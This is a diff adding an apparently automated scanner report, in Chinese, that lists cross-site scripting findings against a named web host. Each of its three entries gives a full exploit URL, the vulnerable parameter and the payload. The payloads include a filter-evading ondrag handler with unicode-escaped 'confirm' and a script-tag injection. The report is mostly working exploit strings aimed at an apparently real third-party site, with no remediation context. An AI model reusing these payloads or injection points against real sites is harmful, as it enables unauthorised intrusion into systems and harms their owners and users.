@@ -1,0 +1,15 @@
+检测网址 : http://mqmy.ygcq.com.cn:8001/2013/pc/demlist.aspx?search="><h1/ondrag=co\u006efir\u006d`1`)>DragMe</h1>3&zt=0&type=0&score=0&d=2033
+提交方式 : GET
+漏洞参数 : search
+攻击载荷 : "><h1/ondrag=co\u006efir\u006d`1`)>DragMe</h1>
+------------------------------------
+检测网址 : http://mqmy.ygcq.com.cn:8001/2013/pc/demlist.aspx?search=3&zt= and 1=2 <script>alert(1)</script>0&type=0&score=0&d=2033
+提交方式 : GET
+漏洞参数 : zt
+攻击载荷 :  and 1=2 <script>alert(1)</script>
+------------------------------------
+检测网址 : http://mqmy.ygcq.com.cn:8001/2013/pc/demlist.aspx?search=3&zt=0&type= and 1=2 <script>alert(1)</script>0&score=0&d=2033
+提交方式 : GET
+漏洞参数 : type
+攻击载荷 :  and 1=2 <script>alert(1)</script>
+------------------------------------
